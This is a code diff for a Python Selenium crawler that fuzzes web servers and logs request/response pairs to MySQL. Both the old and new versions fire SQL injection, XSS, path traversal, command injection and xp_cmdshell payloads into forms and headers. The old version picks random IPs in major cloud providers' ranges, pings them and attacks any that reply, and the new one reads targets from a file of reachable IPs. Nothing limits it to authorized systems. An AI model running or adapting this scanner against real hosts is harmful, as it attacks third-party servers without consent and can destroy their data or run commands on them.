@@ -1,157 +1,219 @@
-import csv
-import time
 import os
-import random
-import requests
-import subprocess
+import time
+import mysql.connector
 from seleniumwire import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+from dotenv import load_dotenv
+import random
+from urllib.parse import urlparse
 
-# Known IP ranges (AWS, Google Cloud, Azure, etc.)
-KNOWN_IP_RANGES = [
-    (13, 104, 0, 0, 13, 107, 255, 255),  # Azure
-    (35, 160, 0, 0, 35, 191, 255, 255),  # Google Cloud
-    (52, 0, 0, 0, 52, 63, 255, 255),     # AWS
-    # Add more ranges as needed
-]
+# Load credentials from .env file
+load_dotenv()
 
-def generate_ip_from_known_ranges():
-    """Generate a random IP address within known IP ranges."""
-    range_selection = random.choice(KNOWN_IP_RANGES)
-    ip = f"{random.randint(range_selection[0], range_selection[4])}." \
-         f"{random.randint(range_selection[1], range_selection[5])}." \
-         f"{random.randint(range_selection[2], range_selection[6])}." \
-         f"{random.randint(range_selection[3], range_selection[7])}"
-    return ip
+# MySQL database connection
+db_connection = mysql.connector.connect(
+    host='127.0.0.1',
+    user='root',
+    password=os.getenv('MYSQL_PASSWORD'),
+    database='web_analysis'
+)
+c_rsp = db_connection.cursor()
+c_lrn = db_connection.cursor()
+c_main = db_connection.cursor()
 
-def ping_ip(ip, timeout=1):
-    """Ping an IP address to check if it is reachable."""
+# Selenium WebDriver path
+driver_path = os.getenv('CHROMEDRIVER_PATH')
+
+def fuzz_parameters():
+    """Generate random fuzzing parameters for input fields."""
+    fuzz_inputs = [
+        "", "<script>alert(1)</script>", "../../etc/passwd", "A" * 1000, 
+        "admin'--", "%00", "!@#$%^&*()", "normalInput", "1234567890",
+        "'; DROP TABLE users; --", "`; exec xp_cmdshell('dir'); --"
+    ]
+    return random.choice(fuzz_inputs)
+
+def fuzz_headers():
+    """Generate random fuzzing headers."""
+    fuzz_headers_list = [
+        {"X-Injected-Header": "' OR '1'='1"},
+        {"X-Exploit-Header": "<script>alert(1)</script>"},
+        {"X-Path-Traversal": "../../etc/passwd"},
+        {"X-Bad-Header": "A" * 1000},
+        {"X-SQL-Comment": "admin'--"},
+        {"X-Null-Byte": "%00"},
+        {"X-Special-Char": "!@#$%^&*()"},
+        {"X-Numeric": "1234567890"},
+        {"X-Normal-Header": "normalInput"},
+        {"X-Empty-Header": ""}
+    ]
+    return random.choice(fuzz_headers_list)
+
+def apply_fuzzing_headers(driver):
+    """Apply fuzzing headers using JavaScript."""
+    headers = fuzz_headers()
+    for header_name, header_value in headers.items():
+        try:
+            # Ensure correct JavaScript syntax
+            js_code = f"""
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', window.location.href, true);
+            xhr.setRequestHeader('{header_name}', `{header_value}`);
+            xhr.send();
+            """
+            driver.execute_script(js_code)
+            time.sleep(3)
+        except Exception as e:
+            print(f"Header fuzzing error: {e}")
+
+
+def decode_safe(data):
+    """Safely decode data if it's in bytes, otherwise return it as is."""
+    if isinstance(data, bytes):
+        try:
+            return data.decode('utf-8', errors='replace')
+        except Exception as e:
+            print(f"Decoding error: {e}")
+            return "<DECODING_ERROR>"
+    elif isinstance(data, str):
+        return data
+    else:
+        print("Unsupported data type")
+        return "<UNSUPPORTED_TYPE>"
+
+
+def save_to_db(req_method, req_path, req_query, req_headers, req_body, res_status, res_headers, res_body):
+    """Save request and response data to the database."""
     try:
-        output = subprocess.run(['ping', '-c', '1', '-W', str(timeout), ip],
-                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return output.returncode == 0
-    except Exception as e:
-        print(f"[*] Ping failed for IP {ip}: {e}")
-        return False
-
-def is_server_reachable(url, timeout=5):
-    """Check if the server at the given URL is reachable."""
-    try:
-        response = requests.head(url, timeout=timeout)
-        return response.status_code == 200
-    except requests.RequestException:
-        return False
-
-def log_request_response(request, response, data_writer):
-    """Log request and response details to the CSV file."""
-    try:
-        req_query = getattr(request, 'query', '')
-        req_body = request.body.decode() if request.body else ''
-        res_body = response.body.decode() if response.body else ''
+        sql_rsp = 'INSERT INTO http_response (status, headers, body) VALUES (%s, %s, %s)'
+        c_rsp.execute(sql_rsp, (res_status, res_headers, res_body))
+        res_id = c_rsp.lastrowid
         
-        data_writer.writerow({
-            'req_method': request.method,
-            'req_path': request.path,
-            'req_query': req_query,
-            'req_headers': str(request.headers),
-            'req_body': req_body,
-            'res_status': response.status_code,
-            'res_headers': str(response.headers),
-            'res_body': res_body,
-            'ip': request.ip,
-            'learned': False
-        })
+        sql_req = 'INSERT INTO request_data (method, path, query, headers, body, res_id) VALUES (%s, %s, %s, %s, %s, %s)'
+        c_lrn.execute(sql_req, (req_method, req_path, req_query, req_headers, req_body, res_id))
+        
+        db_connection.commit()
     except Exception as e:
-        print(f"[*] Error while logging request/response: {e}")
+        print(f"Failed to save to DB: {e}")
 
-def inject_payloads(driver, data_writer):
-    """Inject payloads into form fields and submit them."""
-    payloads = ['; ls', '| ls', "' OR '1'='1", "'; DROP TABLE users;--"]
-    timeout = 10  # Maximum wait time in seconds
+def get_internal_links(driver, base_url):
+    """Extract all internal links from the current page."""
+    links = set()
+    anchor_elements = driver.find_elements(By.TAG_NAME, "a")
+    
+    for element in anchor_elements:
+        href = element.get_attribute("href")
+        if href and href.startswith(base_url):
+            links.add(href)
+    
+    return links
 
+def crawl_by_selenium(url, driver, visited_urls):
+    """Crawl and fuzz a website recursively."""
+    if url in visited_urls:
+        return
+    
+    print("[*] Accessing web server:", url)
+    visited_urls.add(url)
+    
     try:
-        forms = WebDriverWait(driver, timeout).until(EC.presence_of_all_elements_located((By.TAG_NAME, 'form')))
-        for form in forms:
-            inputs = form.find_elements(By.TAG_NAME, 'input')
-            for input_element in inputs:
-                if input_element.get_attribute('type') in ['text', 'password']:
-                    for payload in payloads:
-                        try:
-                            input_element.clear()
-                            input_element.send_keys(payload)
-                            print(f"[*] Injected payload '{payload}' into input field.")
-                            time.sleep(1)  # Allow time for payload injection
-                            form.submit()
-                            print(f"[*] Form submitted with payload '{payload}'.")
-
-                            # Log the request/response after submission
-                            for request in driver.requests:
-                                response = request.response
-                                log_request_response(request, response, data_writer)
-
-                        except Exception as e:
-                            print(f"[*] Error injecting payload: {e}")
-                            continue
+        driver.get(url)
+        time.sleep(10)  # Wait for the page to load completely
     except Exception as e:
-        print(f"[*] Error discovering forms: {e}")
-
-def crawl_and_fuzz(url):
-    """Crawl and fuzz the URL with command injection and SQL injection payloads."""
-    if not is_server_reachable(url):
-        print(f"[*] Server at {url} is not reachable. Skipping...")
+        print(f"Error loading page: {e}")
         return
 
-    driver_path = "/Users/ananya/.wdm/drivers/chromedriver/mac64/127.0.6533.88/chromedriver"
-    service = Service(driver_path)
-    output_file = "crawl_and_fuzz_results.csv"
+    # Fuzz input fields and submit form
+    input_fields = driver.find_elements(By.TAG_NAME, "input")
+    form_data = {}
+    
+    for field in input_fields:
+        try:
+            field_name = field.get_attribute('name')
+            if field_name:
+                fuzz_input = fuzz_parameters()
+                form_data[field_name] = fuzz_input
+                field.send_keys(fuzz_input)
+                ActionChains(driver).send_keys_to_element(field, fuzz_input).perform()
+        except Exception as e:
+            print(f"Fuzzing error: {e}")
 
-    csv.field_size_limit(10000000)
+    # Find and submit the form
+    try:
+        forms = driver.find_elements(By.TAG_NAME, "form")
+        if forms:
+            form = forms[0]
+            form.submit()  # Submit the first form found on the page
+            print(f"[*] Submitted form with fuzzed data: {form_data}")
+    except Exception as e:
+        print(f"Form submission error: {e}")
 
+    # Apply fuzzing headers using JavaScript
+    apply_fuzzing_headers(driver)
+
+    # Log the requests and responses
+    for request in driver.requests:
+        if url in request.url:
+            req_method = request.method
+            req_path = request.path
+            req_query = request.querystring if request.querystring else "<EMP>"
+            req_headers = decode_safe(str(request.headers))
+            req_body = decode_safe(request.body) if request.body else "<EMP>"
+
+            try:
+                res_status = int(request.response.status_code)
+                res_headers = decode_safe(str(request.response.headers))
+                res_body = decode_safe(request.response.body)
+
+            except:
+                res_status = 400
+                res_headers = "<ERROR>"
+                res_body = "Bad Request."
+
+            save_to_db(req_method, req_path, req_query, req_headers, req_body, res_status, res_headers, res_body)
+
+    # Extract all internal links and crawl them recursively
+    internal_links = get_internal_links(driver, url)
+    for link in internal_links:
+        crawl_by_selenium(link, driver, visited_urls)
+
+
+
+def main():
     options = Options()
     options.headless = True
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-
+    service = Service(driver_path)
     driver = webdriver.Chrome(service=service, options=options)
-    driver.set_page_load_timeout(10)
+    
+    # Clear the database tables before new entries
+    sql_main = 'DELETE from request_data'
+    c_main.execute(sql_main)
+    db_connection.commit()
+    
+    sql_main = 'DELETE from http_response'
+    c_main.execute(sql_main)
+    db_connection.commit()
 
-    file_exists = os.path.isfile(output_file)
-    with open(output_file, 'a', newline='', encoding='utf-8') as csvfile:
-        fieldnames = ['req_method', 'req_path', 'req_query', 'req_headers', 'req_body', 
-                      'res_status', 'res_headers', 'res_body', 'ip', 'learned']
-        data_writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-        
-        if not file_exists:
-            data_writer.writeheader()
+    start_time = time.time()
 
-        print(f"[*] Accessing web server: {url}")
-        try:
-            start_time = time.time()
-            driver.get(url)
-            time.sleep(3)
+    visited_urls = set()  # To keep track of visited URLs
+    
+    with open('reachable_ips.txt', 'r') as file:
+        ip_addresses = file.readlines()
 
-            inject_payloads(driver, data_writer)  # Inject payloads via POST requests
-
-        except Exception as e:
-            print(f"[*] Error crawling URL {url}: {e}")
-            with open('error_log.txt', 'a', encoding='utf-8') as error_file:
-                error_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error crawling URL {url}: {e}\n")
-
-        finally:
-            end_time = time.time()
-            print(f"[*] Finished crawling in {end_time - start_time:.2f} seconds.")
+    for ip in ip_addresses:
+        url = f"http://{ip.strip()}"
+        crawl_by_selenium(url, driver, visited_urls)
 
     driver.quit()
+    print("[*] Crawling Time:", time.time() - start_time)
+
+    c_lrn.close()
+    c_rsp.close()
+    db_connection.close()
 
 if __name__ == "__main__":
-    for _ in range(1000):  # Attempt to generate and test 1000 valid IPs
-        random_ip = generate_ip_from_known_ranges()
-        if ping_ip(random_ip):
-            url = f"http://{random_ip}"
-            crawl_and_fuzz(url)
-        else:
-            print(f"[*] IP {random_ip} is not reachable. Skipping...")
+    main()
